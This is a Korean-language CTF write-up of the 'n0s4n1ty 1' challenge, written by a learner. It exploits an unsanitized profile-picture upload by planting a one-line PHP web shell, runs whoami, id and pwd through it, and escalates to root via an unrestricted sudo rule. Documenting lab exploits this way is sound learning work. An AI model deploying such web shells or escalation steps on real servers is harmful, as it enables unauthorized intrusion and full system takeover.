# 문제명
n0s4n1ty 1

## 문제 설명

> 개발자가 프로필 사진 업로드 기능을 추가했지만, 파일 업로드 기능에 보안 문제가 있다. 이를 이용하여 웹 서버에 접근하고 /root 디렉터리에 있는 플래그를 획득하는 문제이다.
문제를 처음 읽었을 때 "File upload was not sanitized" 라는 문장이 가장 중요하다고 생각했다. 처음에는 sanitize가 무슨 뜻인지 몰라 찾아보았는데, 사용자가 입력하거나 업로드하는 데이터를 안전하게 검사하는 과정을 의미했다. 즉, 업로드하는 파일이 이미지인지 확인하거나 위험한 파일을 막는 과정이다. 문제에서는 이 검사가 제대로 이루어지지 않았다고 했으므로 파일 업로드 취약점을 이용하는 문제라고 판단했다.

웹페이지에 접속해 보니 프로필 사진을 업로드하는 기능만 존재했다. 일반적으로는 .jpg, .png 같은 이미지 파일만 업로드되어야 하지만, 검사가 제대로 되지 않는다면 .php 파일도 업로드할 수 있을 것이라고 생각했다.

### 취약점

이 문제의 취약점은 파일 업로드 취약점이다.

원래는 사용자가 이미지만 업로드해야 하지만, 서버에서 파일 확장자나 내용을 제대로 검사하지 않으면 PHP 파일도 업로드할 수 있다. PHP는 웹 서버에서 실행되는 프로그래밍 언어이기 때문에 업로드한 PHP 파일이 실행되면 서버에서 원하는 명령을 실행할 수 있다. 이런 PHP 파일을 웹쉘이라고 부른다.

웹쉘은 서버에서 리눅스 명령어를 실행할 수 있도록 만들어진 작은 프로그램이다.

### 익스플로잇

먼저 메모장을 이용해 shell.php 파일을 생성하였다.

<?php
system($_GET['cmd']);
?>

처음에는 system() 함수가 무엇인지 몰라 찾아보았다.

system() : 리눅스 명령어를 실행하는 PHP 함수
$_GET['cmd'] : URL에서 전달받은 값을 의미한다.

예를 들어

shell.php?cmd=whoami

라고 접속하면 서버에서

whoami

명령이 실행된다.

생성한 shell.php 파일을 업로드하였고, 업로드 결과는 다음과 같았다.

The file shell.php has been uploaded
Path: uploads/shell.php

업로드가 성공했다는 것은 서버가 PHP 파일을 막지 않았다는 의미이며, 업로드된 위치도 함께 확인할 수 있었다.

이후 브라우저에서 다음과 같이 접속하였다.

http://<target>/uploads/shell.php?cmd=pwd

결과는

/var/www/html/uploads

가 출력되었다.

이를 통해 업로드한 PHP 파일이 단순히 저장된 것이 아니라 실제로 서버에서 실행되고 있다는 것을 확인하였다.

이후 여러 리눅스 명령어를 실행하여 현재 환경을 확인하였다.

?cmd=whoami

현재 사용자 확인

?cmd=id

사용자 정보 확인

?cmd=pwd

현재 작업 디렉터리 확인

문제의 힌트에서 "Whenever you get a shell on a remote machine, check sudo -l" 이라고 되어 있었기 때문에 다음 명령을 실행하였다.

?cmd=sudo%20-l

결과는 다음과 같았다.

User www-data may run the following commands on challenge:
(ALL) NOPASSWD: ALL

처음에는 이 문장이 무슨 의미인지 이해하지 못해서 찾아보았다.

www-data : 웹 서버가 사용하는 사용자 계정
ALL : 모든 사용자 권한으로 실행 가능
NOPASSWD : 비밀번호를 입력하지 않아도 됨
ALL : 모든 명령어 실행 가능

즉, 현재 사용자(www-data)가 root 권한으로 모든 명령어를 실행할 수 있다는 의미였다.

권한이 있는지 확인하기 위해 다음 명령을 실행하였다.

?cmd=sudo%20whoami

결과는

root

가 출력되었고, root 권한을 획득한 것을 확인하였다.

## 배운 점

이번 문제를 풀면서 파일 업로드 취약점이 왜 위험한지 직접 이해할 수 있었다. 원래는 이미지 파일만 업로드해야 하지만, 서버에서 업로드 파일을 제대로 검사하지 않으면 PHP 파일도 업로드할 수 있고, 이를 통해 서버에서 원하는 명령어를 실행할 수 있다는 것을 알게 되었다. 또한 웹쉘을 획득한 후에는 바로 플래그를 찾기보다 whoami, id, pwd 등으로 현재 환경을 먼저 확인하고, sudo -l 명령을 통해 권한 상승이 가능한지 확인하는 과정이 매우 중요하다는 것도 배웠다. 이번 문제를 통해 파일 업로드 취약점, 웹쉘, 리눅스 명령 실행, 권한 상승의 기본적인 흐름을 처음부터 끝까지 직접 경험할 수 있었다.
